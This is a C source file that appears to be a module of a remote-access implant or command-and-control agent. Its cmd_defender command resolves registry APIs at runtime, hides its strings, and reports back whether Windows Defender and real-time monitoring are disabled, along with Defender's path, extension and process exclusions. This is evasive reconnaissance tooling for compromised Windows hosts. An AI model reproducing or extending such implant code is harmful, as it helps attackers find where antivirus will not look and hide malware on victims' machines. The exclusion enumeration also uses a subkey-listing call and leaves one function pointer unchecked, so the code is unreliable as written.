#include "config.h"
#ifdef INCLUDE_CMD_DEFENDER

#include "commands.h"
#include "json_out.h"


typedef LONG  (WINAPI *fn_RegOpenKeyExA_t)(void*, LPCSTR, DWORD, DWORD, void**);
typedef LONG  (WINAPI *fn_RegQueryValueExA_t)(void*, LPCSTR, DWORD*, DWORD*, BYTE*, DWORD*);
typedef LONG  (WINAPI *fn_RegCloseKey_t)(void*);
typedef LONG  (WINAPI *fn_RegEnumKeyExA_t)(void*, DWORD, char*, DWORD*, DWORD*, char*, DWORD*, void*, void*);

VOID cmd_defender(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_adv, "advapi32.dll");
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);
    fn_RegOpenKeyExA_t pOpen = h_adv ? (fn_RegOpenKeyExA_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegOpenKeyExA") : NULL;
    fn_RegQueryValueExA_t pQuery = h_adv ? (fn_RegQueryValueExA_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegQueryValueExA") : NULL;
    fn_RegCloseKey_t pClose = h_adv ? (fn_RegCloseKey_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegCloseKey") : NULL;
    fn_RegEnumKeyExA_t pEnum = h_adv ? (fn_RegEnumKeyExA_t)(void*)inst->Win32.GetProcAddress(h_adv, "RegEnumKeyExA") : NULL;
    if (!pOpen || !pQuery || !pClose) {
        package_add_string(inst, response, XSTR("advapi32 resolve failed"));
        response->is_error = TRUE;
        return;
    }

    void* HKLM = (void*)0x80000002;
    JSON_BUF jb;
    j_init(&jb);
    j_append_raw(&jb, "{\"defender\":{");

    // DisableAntiSpyware
    void* k = 0;
    const char* pol = "SOFTWARE\\Policies\\Microsoft\\Windows Defender";
    DWORD disable = 0xFFFFFFFF, disable_ok = 0;
    if (pOpen(HKLM, pol, 0, 0x20019, &k) == 0) {
        DWORD sz = 4, type = 0;
        if (pQuery(k, "DisableAntiSpyware", NULL, &type, (BYTE*)&disable, &sz) == 0)
            disable_ok = 1;
        pClose(k);
    }

    // Real-Time Protection
    const char* rtp = "SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection";
    DWORD rt_disable = 0xFFFFFFFF, rt_ok = 0;
    if (pOpen(HKLM, rtp, 0, 0x20019, &k) == 0) {
        DWORD sz = 4, type = 0;
        if (pQuery(k, "DisableRealtimeMonitoring", NULL, &type, (BYTE*)&rt_disable, &sz) == 0)
            rt_ok = 1;
        pClose(k);
    }

    j_append_raw(&jb, "\"disable_antispyware\":");
    j_append_uint(&jb, disable_ok ? disable : 0xFFFFFFFF);
    j_append_raw(&jb, ",\"disable_realtime\":");
    j_append_uint(&jb, rt_ok ? rt_disable : 0xFFFFFFFF);

    // Exclusions
    j_append_raw(&jb, ",\"exclusions\":{");
    const char* excl_paths[] = {"Paths", "Extensions", "Processes"};
    const char* excl_names[] = {"paths", "extensions", "processes"};
    for (int ei = 0; ei < 3; ei++) {
        if (ei) j_append_raw(&jb, ",");
        j_append_raw(&jb, "\"");
        j_append_raw(&jb, excl_names[ei]);
        j_append_raw(&jb, "\":[");
        char excl_path[256];
        int p = 0;
        const char* base = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\";
        for (; *base; base++) excl_path[p++] = *base;
        for (const char* e = excl_paths[ei]; *e; e++) excl_path[p++] = *e;
        excl_path[p] = 0;
        void* ek = 0;
        if (pOpen(HKLM, excl_path, 0, 0x20019, &ek) == 0) {
            char vname[256];
            DWORD vlen = 256, idx = 0;
            BOOL first = TRUE;
            while (pEnum(ek, idx, vname, &vlen, NULL, NULL, NULL, NULL, NULL) == 0) {
                vname[255] = 0;   // guard: API NUL-terminates within vlen; cap anyway
                if (!first) j_append_raw(&jb, ",");
                j_append_str(&jb, vname);
                first = FALSE;
                vlen = 256;
                idx++;
            }
            pClose(ek);
        }
        j_append_raw(&jb, "]");
    }
    j_append_raw(&jb, "}}}");
    package_add_bytes(inst, response, (BYTE*)jb.buf, jb.len);
}

#endif
